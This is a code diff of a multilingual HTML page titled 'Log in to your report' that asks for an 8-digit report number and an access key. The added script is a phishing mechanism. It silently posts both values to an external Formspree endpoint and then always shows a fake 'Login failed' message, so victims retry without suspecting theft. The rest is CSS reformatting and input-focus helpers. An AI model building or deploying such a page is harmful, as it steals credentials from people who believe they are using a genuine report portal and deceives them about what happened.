@@ -5,62 +5,215 @@
   <title>Log in to your report</title>
   <style>
     body {
-      margin:0;
-      font-family:Arial,sans-serif;
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      justify-content:center;
-      height:100vh;
-      background:#f9f9f9;
-    }
-    .top-bar {
-      position:absolute;
-      top:0;
-      left:0;
-      width:100%;
-      background:white;
-      height:60px;
-      display:flex;
-      justify-content:flex-end;
-      align-items:center;
-      padding:0 20px;
-      box-shadow:0 1px 5px rgba(0,0,0,0.1);
-    }
-    .language-select {
-      padding:6px;
-      border:1px solid #ccc;
-      border-radius:4px;
-      font-size:14px;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #f9f9f9;
     }
     .login-box {
-      background:#fff;
-      padding:40px;
-      border-radius:8px;
-      box-shadow:0 2px 10px rgba(0,0,0,0.1);
-      width:380px;
-      text-align:center;
+      background: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      width: 380px;
+      text-align: center;
     }
-    h2 { margin-bottom:25px; color:#222; font-size:20px; }
-    .input-group { margin-bottom:18px; text-align:left; }
-    .input-group label { font-size:14px; color:#333; display:block; margin-bottom:6px; }
-    .code-input { display:flex; justify-content:space-between; gap:6px; }
-    .code-input input { width:36px; height:42px; font-size:20px; text-align:center; border:1px solid #ccc; border-radius:5px; }
-    .code-input input:focus { border-color:#00695c; outline:none; box-shadow:0 0 4px #80cbc4; }
-    .forgot { display:block; margin:15px 0 20px; font-size:13px; color:#00695c; text-decoration:none; text-align:center; }
-    .forgot:hover { text-decoration:underline; }
-    .btn-login { width:100%; padding:12px; background:#00695c; color:white; font-size:16px; border:none; border-radius:6px; cursor:pointer; }
-    .btn-login:hover { background:#004d40; }
+    h2 {
+      margin-bottom: 25px;
+      color: #222;
+      font-size: 20px;
+    }
+    .input-group {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+    .input-group label {
+      font-size: 14px;
+      color: #333;
+      display: block;
+      margin-bottom: 6px;
+    }
+    .code-input {
+      display: flex;
+      justify-content: space-between;
+      gap: 6px;
+    }
+    .code-input input {
+      width: 36px;
+      height: 42px;
+      font-size: 20px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .code-input input:focus {
+      border-color: #00695c;
+      outline: none;
+      box-shadow: 0 0 4px #80cbc4;
+    }
+    .forgot {
+      display: block;
+      margin: 15px 0 20px;
+      font-size: 13px;
+      color: #00695c;
+      text-decoration: none;
+      text-align: center;
+    }
+    .forgot:hover {
+      text-decoration: underline;
+    }
+    .btn-login {
+      width: 100%;
+      padding: 12px;
+      background: #00695c;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .btn-login:hover {
+      background: #004d40;
+    }
   </style>
 </head>
 <body>
-  <!-- 顶部语言选择 -->
-  <div class="top-bar">
-    <select class="language-select" onchange="changeLanguage(this.value)">
-      <option value="zh">中文</option>
-      <option value="en">English</option>
-      <option value="ms">Bahasa Melayu</option>
-      <option value="my">မြန်မာစာ (Burmese)</option>
-      <option value="bn">বাংলা (Bengali)</option>
-      <option value="ne">नेपाली (Nepali)</option>
+  <div class="login-box">
+    <h2 id="title">Log in to your report</h2>
 
+    <form id="loginForm">
+      <div class="input-group">
+        <label id="label-report">Enter your 8-digit report number</label>
+        <div class="code-input" id="codeInputs">
+          <input type="text" maxlength="1" name="digit1">
+          <input type="text" maxlength="1" name="digit2">
+          <input type="text" maxlength="1" name="digit3">
+          <input type="text" maxlength="1" name="digit4">
+          <input type="text" maxlength="1" name="digit5">
+          <input type="text" maxlength="1" name="digit6">
+          <input type="text" maxlength="1" name="digit7">
+          <input type="text" maxlength="1" name="digit8">
+        </div>
+      </div>
+
+      <div class="input-group">
+        <label for="secureCode" id="label-access">Enter your access key</label>
+        <input type="text" id="secureCode" name="access_key" placeholder="Access key">
+      </div>
+
+      <a href="#" class="forgot" id="forgot">Forgot login?</a>
+      <button type="submit" class="btn-login" id="loginBtn">Log In</button>
+    </form>
+  </div>
+
+  <script>
+    // === 多语言设置 ===
+    const translations = {
+      en: {
+        title: "Log in to your report",
+        report: "Enter your 8-digit report number",
+        access: "Enter your access key",
+        forgot: "Forgot login?",
+        button: "Log In",
+        failed: "Login failed. Please check your report number or access key."
+      },
+      zh: {
+        title: "登录您的报告",
+        report: "请输入您的8位报告编号",
+        access: "请输入您的访问码",
+        forgot: "忘记登录信息？",
+        button: "登录",
+        failed: "登录失败，请检查报告编号或访问码。"
+      },
+      "zh-TW": {
+        title: "登入您的報告",
+        report: "請輸入您的8位報告編號",
+        access: "請輸入您的存取碼",
+        forgot: "忘記登入資訊？",
+        button: "登入",
+        failed: "登入失敗，請檢查報告編號或存取碼。"
+      },
+      ms: {
+        title: "Log masuk ke laporan anda",
+        report: "Masukkan nombor laporan 8 digit anda",
+        access: "Masukkan kod capaian anda",
+        forgot: "Lupa log masuk?",
+        button: "Log Masuk",
+        failed: "Log masuk gagal. Sila semak nombor laporan atau kod capaian anda."
+      },
+      my: {
+        title: "သင်၏အစီရင်ခံစာသို့ ဝင်ပါ",
+        report: "သင်၏ ၈ လုံးနံပါတ်ကို ရိုက်ထည့်ပါ",
+        access: "သင်၏ ဝင်ရောက်ကုဒ်ကို ရိုက်ထည့်ပါ",
+        forgot: "လော့ဂ်အင်မေ့နေပါသလား?",
+        button: "ဝင်ပါ",
+        failed: "လော့ဂ်အင် မအောင်မြင်ပါ။ အစီရင်ခံနံပါတ် သို့မဟုတ် ဝင်ရောက်ကုဒ်ကို စစ်ဆေးပါ။"
+      }
+    };
+
+    function setLanguage() {
+      const selected = localStorage.getItem("lang") || "en";
+      const t = translations[selected] || translations["en"];
+      document.getElementById("title").textContent = t.title;
+      document.getElementById("label-report").textContent = t.report;
+      document.getElementById("label-access").textContent = t.access;
+      document.getElementById("forgot").textContent = t.forgot;
+      document.getElementById("loginBtn").textContent = t.button;
+      document.getElementById("loginBtn").dataset.failedMsg = t.failed;
+    }
+
+    setLanguage();
+
+    // 自动跳转输入框
+    const inputs = document.querySelectorAll('#codeInputs input');
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    // 提交表单 -> Formspree -> 然后显示弹窗
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const msg = document.getElementById("loginBtn").dataset.failedMsg || "Login failed.";
+      const digits = Array.from(document.querySelectorAll('#codeInputs input'))
+        .map(input => input.value)
+        .join('');
+      const key = document.getElementById('secureCode').value;
+      const lang = localStorage.getItem('lang') || 'en';
+
+      try {
+        // ✅ 先提交到 Formspree
+        const res = await fetch("https://formspree.io/f/mgvnnaey", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            report_number: digits,
+            access_key: key,
+            language: lang,
+            source: "8digit&pw.html"
+          })
+        });
+
+        console.log("✅ Sent to Formspree:", res.status);
+      } catch (err) {
+        console.error("❌ Send error:", err);
+      }
+
+      // ✅ 最后再显示弹窗（即使提交成功也会显示）
+      alert(msg);
+    });
+  </script>
+</body>
+</html>
